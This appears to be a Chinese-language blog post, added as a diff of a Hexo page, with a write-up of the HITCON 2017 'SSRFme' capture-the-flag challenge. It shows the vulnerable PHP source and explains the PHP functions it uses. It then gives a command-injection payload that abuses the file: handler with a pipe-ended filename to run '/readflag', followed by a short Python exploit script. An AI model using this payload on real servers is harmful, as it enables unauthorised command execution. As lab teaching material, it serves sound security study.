@@ -1,0 +1,243 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HITCON：2017-SSRFme - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="117.21.200.165 &amp;lt;?php
+    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
+        $http_x_headers ,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">HITCON：2017-SSRFme</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">HITCON：2017-SSRFme</h1>
+        <div class="stuff">
+            <span>六月 08, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/HITCON/" rel="tag">HITCON</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <pre><code>117.21.200.165 &lt;?php
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
+    }
+
+    echo $_SERVER["REMOTE_ADDR"];
+
+    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+
+    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
+    $info = pathinfo($_GET["filename"]);
+    $dir  = str_replace(".", "", basename($info["dirname"]));
+    @mkdir($dir);
+    @chdir($dir);
+    @file_put_contents(basename($info["basename"]), $data);
+    highlight_file(__FILE__);</code></pre>
+<ul>
+<li><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+</li>
+<li><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p>
+</li>
+<li><p>pathinfo() 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 options。</p>
+</li>
+<li><p>basename — 返回路径中的文件名部分</p>
+</li>
+<li><p>$_SERVER[“REMOTE_ADDR”]#是用户访问页面用的公网IP</p>
+<h3 id="php-isset-函数"><a href="#php-isset-函数" class="headerlink" title="php isset 函数"></a>php isset 函数</h3><p>检测变量是否设置</p>
+<p>若变量不存在则返回 FALSE </p>
+<p>若变量存在且其值为NULL，也返回 FALSE </p>
+<p>若变量存在且值不为NULL，则返回 TURE </p>
+<h3 id="PHP-explode-函数"><a href="#PHP-explode-函数" class="headerlink" title="PHP explode 函数"></a>PHP explode 函数</h3><p>explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</p>
+<p>举例：（菜鸟教程）</p>
+<pre><code>&lt;?php
+$str = "www.runoob.com";
+print_r (explode(".",$str));
+?&gt;</code></pre>
+<pre><code>Array
+(
+    [0] =&gt; www
+    [1] =&gt; runoob
+    [2] =&gt; com
+)</code></pre>
+</li>
+</ul>
+<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>回到题目</p>
+<pre><code>orange+ip地址</code></pre>
+<p>访问</p>
+<pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875</code></pre>
+<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608212437627.png" alt="image-20210608212437627"></p>
+<p>执行两次</p>
+<pre class=" language-cpp"><code class="language-cpp"><span class="token operator">?</span>url<span class="token operator">=</span>file<span class="token operator">:</span>ls <span class="token operator">/</span><span class="token operator">|</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span></code></pre>
+<p>访问：</p>
+<pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/ls /|</code></pre>
+<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608212926383.png" alt="image-20210608212926383"></p>
+<p><code>然后readflag，如果直接/readflag的话，那么会在服务器的根目录创建这个文件，而不是在网站的那个目录，所以是无法命令执行的，所以可以用bash -c 相当于./readflag，而根据php字符解析特性，如果直接将./readflag传入，那么.就会变成下划线,从而不能命令执行。直接bash的话好像是只能bash 有sh后缀的文件，所以不能用</code><br><code>综上所述，bash -c 是最好的选择</code><br>同样运行两遍</p>
+<pre><code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></pre>
+<p>进到路径即可</p>
+<pre><code>sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/bash%20-c%20/readflag%7C</code></pre>
+<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608213537379.png" alt="image-20210608213537379"></p>
+<p>脚本：</p>
+<pre><code>#coding:utf-8
+import requests
+
+url = 'http://678e005f-4a09-4a0a-8fc8-4c03bc330ef3.node3.buuoj.cn/'
+exp = 'file:bash -c /readflag|'
+payload = "?url={}&amp;filename=data"
+see = 'sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/data'
+
+r = requests.get(url = url+payload.format(exp))
+r = requests.get(url+see)
+print(r.text)</code></pre>
+<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608214022020.png" alt="image-20210608214022020"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-isset-%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">php isset 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-explode-%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">PHP explode 函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFme"><span class="toc-number"></span> <span class="toc-text">SSRFme</span></a>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
